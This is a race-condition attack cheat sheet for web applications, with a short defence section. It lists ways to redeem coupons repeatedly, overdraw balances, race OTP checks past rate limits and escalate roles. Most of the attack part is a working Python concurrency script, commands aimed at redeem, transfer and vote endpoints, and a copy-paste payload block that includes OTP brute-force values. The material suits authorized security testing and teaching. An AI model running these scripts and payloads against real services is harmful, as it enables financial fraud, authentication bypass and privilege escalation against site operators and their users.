# RACE CONDITIONS PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS A RACE CONDITION?

A **Race Condition** occurs when multiple operations access shared resources concurrently without proper synchronization, and the final result depends on the unpredictable order of execution. In web applications, attackers exploit **Time-of-Check to Time-of-Use (TOCTOU)** windows to perform actions that shouldn't be possible in a single, sequential request.

**Impact:**
- Redeem a coupon or gift card multiple times
- Bypass rate limits (login, OTP)
- Withdraw more money than the account balance
- Bypass quantity limits (buy 1 item, receive multiple)
- Duplicate transactions or votes
- Bypass file upload restrictions
- Escalate privileges by racing role updates

**Key fact:** It is in the **OWASP Top 10** (A04:2021 – Insecure Design).

---

## 2. TYPES OF RACE CONDITIONS

| Type | Description |
|------|-------------|
| **TOCTOU (Time-of-Check to Time-of-Use)** | The state is validated, but changes before the action is performed. |
| **Limit Overrun** | A limit is checked, but multiple requests slip through before the counter is updated. |
| **Multi-Endpoint Race** | Different endpoints interact with the same resource, causing inconsistency. |
| **Single-Endpoint Race** | The same endpoint is called multiple times concurrently. |
| **Partial Construction** | An object is used before its full initialization is completed. |

---

## 3. COMMON TARGETS

- **Coupon / Gift Card Redemption**
- **Fund Transfers / Withdrawals**
- **Voting / Rating Systems**
- **OTP / 2FA Verification**
- **Password Reset Tokens**
- **File Uploads (validation race)**
- **Like / Follow / Subscribe Buttons**
- **Limited Inventory Purchases**
- **Account Creation (email uniqueness check)**
- **Role / Permission Updates**

---

## 4. DETECTION TECHNIQUES

### 4.1 Manual Detection
- Send two or more requests in parallel using Burp Repeater's "Send group in parallel" feature.
- Observe if the server processes both without proper state validation.
- Look for inconsistent responses or duplicated side effects.

### 4.2 Indicators of Vulnerability
- No database-level locks or transactions.
- No idempotency keys.
- Validation happens in application code, not at the DB layer.
- Rate limits enforced by counters without atomic operations.
- File writes to disk without exclusive locks.

---

## 5. EXPLOITATION PATTERNS

### 5.1 Coupon Redeem Race
Send 20+ simultaneous requests to redeem the same coupon. If the balance is applied multiple times, the race is exploitable.

### 5.2 Fund Transfer Race
If the balance is checked before the transfer is committed, send multiple concurrent transfers that exceed the balance.

### 5.3 OTP Brute Force Race
Race multiple OTP attempts to bypass rate limiting and try all digits in a single window.

### 5.4 Vote / Like Race
Send many concurrent vote requests to inflate the count.

### 5.5 Upload Race
Upload a malicious file while the validation check is still in progress (before it gets removed).

### 5.6 Role Update Race
Race two requests: one to change your role to admin, another to perform an admin action.

### 5.7 Email Verification Race
Race multiple email verification requests with the same token.

---

## 6. TOOLS AND TECHNIQUES

| Tool | Usage |
|------|-------|
| **Burp Suite (Turbo Intruder)** | Send many parallel requests with precise timing. |
| **Burp Repeater (Send group in parallel)** | Send multiple requests in parallel. |
| **Race The Web** | Open-source race condition testing tool. |
| **Custom Python scripts (asyncio, aiohttp)** | Precise control over concurrency. |
| **HTTP/2 Single-Packet Attack** | Send all requests in a single TCP packet to bypass network jitter. |
| **curl with parallel (`--parallel`)** | Send multiple requests concurrently. |

**HTTP/2 Single-Packet Attack:** All requests are sent in a single TCP packet, eliminating network latency differences and making the race window extremely narrow. This is the most reliable technique for modern servers.

---

## 7. BYPASS TECHNIQUES

- **HTTP/2 Multiplexing:** Send multiple requests over the same connection.
- **Request Smuggling + Race:** Chain with CL.TE or TE.CL to desync.
- **Session Fixation:** Race the session token exchange.
- **File Upload + Race:** Upload a temporary file and include it before deletion.
- **Cookie Alignment:** Use the same session cookie across all requests.
- **Pre-Warm Connection:** Open the TCP/TLS connection before firing.

---

## 8. TOOLS

| Tool | Usage |
|------|-------|
| **Burp Suite Pro** | Turbo Intruder for advanced race attacks. |
| **Race The Web** | Python tool for race condition testing. |
| **aiohttp / asyncio** | Custom Python scripts. |
| **h2 / hyper** | HTTP/2 single-packet attack. |
| **curl** | `--parallel --parallel-immediate` |

---

## 9. DEFENSE / PREVENTION

| Rule | Explanation |
|------|-------------|
| **1. Database-level locks** | Use `SELECT ... FOR UPDATE` or atomic updates. |
| **2. Atomic operations** | Use `UPDATE balance = balance - 100 WHERE balance >= 100`. |
| **3. Idempotency keys** | Require a unique key per transaction. |
| **4. Unique constraints** | Prevent duplicate rows at the DB level. |
| **5. Transactions with proper isolation** | Use `SERIALIZABLE` where needed. |
| **6. Row-level locks** | Prevent concurrent modification. |
| **7. Distributed locks** | Use Redis, etcd, or Zookeeper. |
| **8. Rate limiting (server-side)** | With atomic counters. |
| **9. Message queues** | Serialize critical operations. |
| **10. Monitor for anomalies** | Detect duplicate operations. |

---

## 10. TIPS FOR TESTING

1. Identify endpoints with state-changing operations.
2. Look for coupon redemption, fund transfers, votes, and OTP verifications.
3. Send concurrent requests using Burp Turbo Intruder or custom scripts.
4. Use HTTP/2 single-packet attack when possible.
5. Observe for duplicated side effects (e.g., balance applied twice).
6. Try both parallel requests and single-packet attacks.
7. Test with small amounts first to avoid damaging data.
8. Always test on your own account first.
9. Check response times and server logs for anomalies.
10. Combine with other vulnerabilities (e.g., IDOR) for greater impact.

---

## 11. PYTHON TESTING SCRIPT

This script sends multiple concurrent requests to a target endpoint using `asyncio` and `aiohttp`. It is designed to help you test for race conditions in authorized environments.

```python
#!/usr/bin/env python3
"""
Race Condition Tester
Usage: python3 race.py <url> <method> <data> <cookies> <count>
Example:
    python3 race.py "http://target.com/redeem" POST "coupon=SAVE10" "session=abc123" 20
"""

import asyncio
import aiohttp
import sys
import time
from argparse import ArgumentParser


async def send_request(session, method, url, data, headers, results, index):
    try:
        start = time.time()
        async with session.request(method, url, data=data, headers=headers) as resp:
            body = await resp.text()
            elapsed = time.time() - start
            results.append({
                "index": index,
                "status": resp.status,
                "length": len(body),
                "time": round(elapsed, 4),
                "body": body[:200]
            })
    except Exception as e:
        results.append({
            "index": index,
            "error": str(e)
        })


async def main():
    parser = ArgumentParser(description="Race Condition Tester")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-m", "--method", default="POST", help="HTTP method (default: POST)")
    parser.add_argument("-d", "--data", default="", help="POST data (e.g., 'key=value')")
    parser.add_argument("-c", "--cookies", default="", help="Cookie header (e.g., 'session=abc')")
    parser.add_argument("-H", "--header", action="append", default=[], help="Extra header (can be used multiple times)")
    parser.add_argument("-n", "--count", type=int, default=20, help="Number of concurrent requests (default: 20)")
    parser.add_argument("--http2", action="store_true", help="Force HTTP/2")
    args = parser.parse_args()

    headers = {}
    if args.cookies:
        headers["Cookie"] = args.cookies
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    data = {}
    if args.data:
        for pair in args.data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                data[k] = v

    results = []

    async with aiohttp.ClientSession() as session:
        tasks = [
            send_request(session, args.method, args.url, data, headers, results, i)
            for i in range(args.count)
        ]
        await asyncio.gather(*tasks)

    print(f"\n[+] Sent {args.count} concurrent requests to {args.url}")
    print(f"[+] Method: {args.method}")
    print(f"[+] Data: {data}")
    print(f"[+] Cookies: {args.cookies}\n")
    print(f"{'#':<4}{'Status':<8}{'Length':<10}{'Time':<10}")
    print("-" * 35)
    for r in sorted(results, key=lambda x: x.get("index", 0)):
        if "error" in r:
            print(f"{r['index']:<4}ERROR: {r['error']}")
        else:
            print(f"{r['index']:<4}{r['status']:<8}{r['length']:<10}{r['time']:<10}")

    # Basic analysis
    statuses = [r["status"] for r in results if "status" in r]
    lengths = [r["length"] for r in results if "length" in r]
    if statuses:
        unique_status = set(statuses)
        unique_lengths = set(lengths)
        print("\n[ANALYSIS]")
        print(f"  Status codes: {unique_status}")
        print(f"  Unique response lengths: {len(unique_lengths)}")
        if len(unique_lengths) > 1:
            print("  [!] Different response lengths detected — possible race condition!")
        else:
            print("  [i] All responses look identical.")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    asyncio.run(main())
```

### How to use the script

```bash
# Install dependencies
pip install aiohttp

# Basic race test (20 requests)
python3 race.py "http://target.com/redeem" -m POST -d "coupon=SAVE10" -c "session=abc123" -n 20

# Test with extra headers
python3 race.py "http://target.com/api/transfer" -m POST -d "amount=100&to=123" -c "session=abc" -H "X-Requested-With: XMLHttpRequest" -n 30

# Test with HTTP/2
python3 race.py "https://target.com/vote" -m POST -d "id=1" -n 50 --http2
```

### Tips for the script
- Use the same session cookie across all requests.
- Increase `-n` for larger bursts (e.g., 50, 100).
- Look for differences in response length, status, or timing.
- For HTTP/2 single-packet attack, use **Burp Turbo Intruder** (more reliable).

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
POST /redeem HTTP/1.1
POST /transfer HTTP/1.1
POST /vote HTTP/1.1
POST /verify-otp HTTP/1.1
POST /withdraw HTTP/1.1
POST /purchase HTTP/1.1
POST /coupon/apply HTTP/1.1
POST /gift-card/redeem HTTP/1.1
POST /like HTTP/1.1
POST /follow HTTP/1.1
POST /signup HTTP/1.1
POST /reset-password HTTP/1.1
POST /change-role HTTP/1.1
POST /upload HTTP/1.1
GET /redeem?coupon=SAVE10
GET /vote?id=1
GET /like?id=1
coupon=SAVE10&coupon=SAVE10&coupon=SAVE10
amount=100&amount=100&amount=100
id=1&id=1&id=1
otp=0000&otp=0001&otp=0002&otp=0003&otp=0004&otp=0005&otp=0006&otp=0007&otp=0008&otp=0009
password=pass1&password=pass2&password=pass3
pip install aiohttp
python3 race.py "http://target.com/redeem" -m POST -d "coupon=SAVE10" -c "session=abc123" -n 20
python3 race.py "http://target.com/api/transfer" -m POST -d "amount=100&to=123" -c "session=abc" -H "X-Requested-With: XMLHttpRequest" -n 30
python3 race.py "https://target.com/vote" -m POST -d "id=1" -n 50 --http2
Burp Turbo Intruder
Burp Repeater - Send group in parallel
Race The Web
HTTP/2 Single-Packet Attack
curl --parallel --parallel-immediate
```
